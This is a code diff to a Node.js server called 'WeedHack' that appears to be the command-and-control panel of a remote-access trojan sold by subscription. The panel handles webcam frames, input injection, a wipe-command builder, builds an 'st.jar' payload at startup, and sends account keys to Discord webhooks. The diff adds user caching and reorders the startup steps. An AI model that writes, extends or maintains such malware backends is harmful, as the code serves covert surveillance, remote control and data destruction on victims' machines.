@@ -17,6 +17,7 @@ import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMo
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
+import { getCachedUser, invalidateUser, userCacheById, userCacheByKey } from './cache.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -52,22 +53,6 @@ const tlsOpts = {
   cert: fs.readFileSync(CFG.tlsCert),
   key:  fs.readFileSync(CFG.tlsKey),
 };
-
-// Async startup tasks
-(async () => {
-  try {
-    console.log('[startup] Initializing Database...');
-    await initDb();
-    console.log('[startup] Database ready.');
-    
-    console.log('[startup] Building st.jar payload...');
-    await buildJavaPayload();
-    console.log('[startup] st.jar built successfully.');
-  } catch (e) {
-    console.error('[startup] Failed startup:', e);
-    process.exit(1);
-  }
-})();
 
 const app = express();
 app.disable('x-powered-by');
@@ -203,11 +188,7 @@ async function sendWebhook(url, payload) {
 }
 
 async function getOwnUser(uid) {
-  const [rows] = await db.query(`
-    SELECT id, username, email, account_key, login_token, discord_webhook, created_at, premium_until
-    FROM users WHERE id = ?
-  `, [uid]);
-  return rows[0];
+  return await getCachedUser(uid);
 }
 
 // ─── wipe command builder ────────────────────────────────────────────────────
@@ -355,7 +336,19 @@ app.post('/api/signup', limitAuth, async (req, res) => {
     VALUES (?, ?, ?, ?, ?, ?, ?)
   `, [username, email, hash, accountKey, loginToken, discordWebhook, Date.now()]);
 
-  const user = { id: Number(info.insertId), username };
+  const user = { 
+    id: Number(info.insertId), 
+    username, 
+    email, 
+    account_key: accountKey, 
+    login_token: loginToken, 
+    discord_webhook: discordWebhook, 
+    created_at: Date.now(), 
+    premium_until: 0 
+  };
+  
+  userCacheById.set(user.id, user);
+  userCacheByKey.set(user.account_key, user);
 
   sendWebhook(discordWebhook, {
     content: `keys for **${username}**`,
@@ -401,6 +394,9 @@ app.post('/api/signin', limitAuth, async (req, res) => {
 
   if (!user) return res.status(401).json({ error: 'invalid credentials' });
 
+  userCacheById.set(user.id, user);
+  userCacheByKey.set(user.account_key, user);
+
   res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
   res.json({ ok: true, username: user.username });
 });
@@ -430,7 +426,9 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
     embeds: [{ title: 'connection live', color: 0x29B6F6, timestamp: new Date().toISOString() }],
   });
   if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
+  
   await db.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
+  invalidateUser(req.user.uid);
   res.json({ ok: true });
 });
 
@@ -961,6 +959,7 @@ app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
   const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);
 
   await db.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
+  invalidateUser(user.id);
 
   const dateStr = new Date(newExpiry).toLocaleString();
   res.json({ ok: true, message: `Premium active until ${dateStr}` });
@@ -976,6 +975,7 @@ app.post('/api/admin/remove', limitAdmin, async (req, res) => {
   if (!users.length) return res.status(404).json({ error: 'User not found' });
 
   await db.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
+  invalidateUser(users[0].id);
   res.json({ ok: true, message: 'Premium removed successfully' });
 });
 
@@ -1150,16 +1150,33 @@ const udpSock = startUdp({
 });
 
 const httpServer = http.createServer(app);
-httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
-  console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
-});
-
 const tlsHttpServer = https.createServer(tlsOpts, app);
-tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
-tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
-  console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
-  console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
-});
+
+(async () => {
+  try {
+    console.log('[startup] Initializing Database...');
+    await initDb();
+    console.log('[startup] Database ready.');
+    
+    console.log('[startup] Building st.jar payload...');
+    await buildJavaPayload();
+    console.log('[startup] st.jar built successfully.');
+
+    httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
+      console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
+    });
+
+    tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
+    tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
+      console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
+      console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
+    });
+
+  } catch (e) {
+    console.error('[startup] Failed startup:', e);
+    process.exit(1);
+  }
+})();
 
 let shuttingDown = false;
 
@@ -1170,7 +1187,6 @@ function shutdown(sig) {
 
   httpServer.close(() => console.log('[shutdown] http closed'));
   tlsHttpServer.close(() => console.log('[shutdown] https closed'));
-
   closeUdp();
 
   setTimeout(() => process.exit(0), 3000).unref();
